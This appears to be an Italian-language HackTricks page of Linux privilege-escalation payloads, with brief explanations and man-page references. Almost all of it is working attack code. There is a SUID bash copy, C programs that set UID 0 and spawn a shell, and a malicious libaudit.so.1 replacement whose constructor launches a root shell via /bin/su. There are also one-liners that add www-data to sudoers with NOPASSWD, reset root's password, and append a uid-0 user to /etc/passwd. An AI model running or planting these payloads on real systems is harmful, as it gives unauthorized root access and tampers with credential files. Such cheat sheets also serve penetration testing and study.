# Payload da eseguire

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` abilita la modalità privilegiata: quando Bash viene avviato con ID reali ed effettivi diversi, non reimposta l'ID effettivo sull'ID reale. La shell risultante dipende comunque dalle credenziali esistenti del chiamante.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid` modifica gli ID reale, effettivo e salvato quando è consentito, mentre `setuid` modifica l'ID effettivo e può anche impostare gli ID reale e salvato per un chiamante privilegiato. `execve` sostituisce l'immagine del processo corrente con il programma richiesto.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> Questi esempi omettono i controlli del valore restituito; entrambe le chiamate alle credenziali possono fallire anche per UID 0.<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Sovrascrivere un file per aumentare i privilegi

### File comuni

Questi sono file e interfacce comuni per il controllo locale dei privilegi: `/etc/passwd` memorizza i record degli account composti da sette campi, `/etc/shadow` memorizza dati opzionali sulle password crittografate, `sudoers` definisce i privilegi e i tag di sudo come `NOPASSWD`, mentre l'endpoint daemon predefinito di Docker è un socket Unix in `/var/run/docker.sock`; l'accesso a tale socket può concedere il controllo a livello root dell'host.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Aggiungere un utente con password a _/etc/passwd_
- Modificare la password all'interno di _/etc/shadow_
- Aggiungere un utente a sudoers in _/etc/sudoers_
- Abusare di Docker attraverso il docker socket, solitamente in _/run/docker.sock_ o _/var/run/docker.sock_

### Sovrascrivere una libreria

Verificare quali librerie condivise utilizza un binario; in questo esempio, esaminare `/bin/su` con `ldd`.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd` mostra le dipendenze degli oggetti condivisi, mentre il linker dinamico utilizza i metadati ELF e le relative regole di ricerca per caricarli in fase di esecuzione.<sup>[[9]](#references)[[10]](#references)</sup>

Per esaminare un candidato, usa `objdump -T` per visualizzare la tabella dei simboli dinamici di `su` e filtrare i nomi degli audit.<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_user_message` e `audit_log_acct_message` sono funzioni di libaudit; `audit_fd` è mostrato come un oggetto dati definito nella sezione `.bss` di `su` in questo output.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Una library sostitutiva deve esportare definizioni compatibili per i simboli non definiti che il loader risolve; ABI non compatibili tra funzioni e dati possono comunque causare il fallimento del processo quando tali simboli vengono rilocati o chiamati.<sup>[[10]](#references)[[11]](#references)</sup>

L'attributo `constructor` di GCC fa sì che `inject` venga chiamata automaticamente prima di `main` sui target supportati.<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Se la replacement viene caricata correttamente da un processo **`/bin/su`** privilegiato, questo constructor può avviare **`/bin/bash`** con i privilegi di tale processo; il risultato esatto dipende dall'ambiente.<sup>[[10]](#references)[[15]](#references)</sup>

## Script

Puoi fare in modo che root esegua qualcosa?

`sudoers` usa il tag `NOPASSWD` nelle policy entries, `chpasswd` legge coppie `user:password` dallo standard input e `/etc/passwd` usa sette campi dell'account separati da due punti; gli esempi seguenti presuppongono che i file pertinenti siano scrivibili dal processo che li esegue.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data a sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **Modifica la password di root**
```bash
echo "root:hacked" | chpasswd
```
### Aggiungere un nuovo utente root a /etc/passwd

Il payload finale dipende da un target che accetta l'hash `crypt` generato: il `mkpasswd -m sha-512` di Debian esegue il mapping verso SHA-512 crypt (`$6$`), mentre `passwd -1 -salt` di OpenSSL utilizza l'algoritmo BSD basato su MD5 (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [Il comando incorporato Set (Manuale di riferimento di Bash)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Pagine del manuale Debian](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Proteggere il socket del daemon Docker](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Documentazione di Docker](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (utility binarie GNU)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Pagine del manuale Debian](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Pagine del manuale Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Pagine del manuale Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Attributi comuni (Utilizzo della GNU Compiler Collection)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — pagina del manuale di Linux](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Sorgenti Debian](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — Documentazione di OpenSSL](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
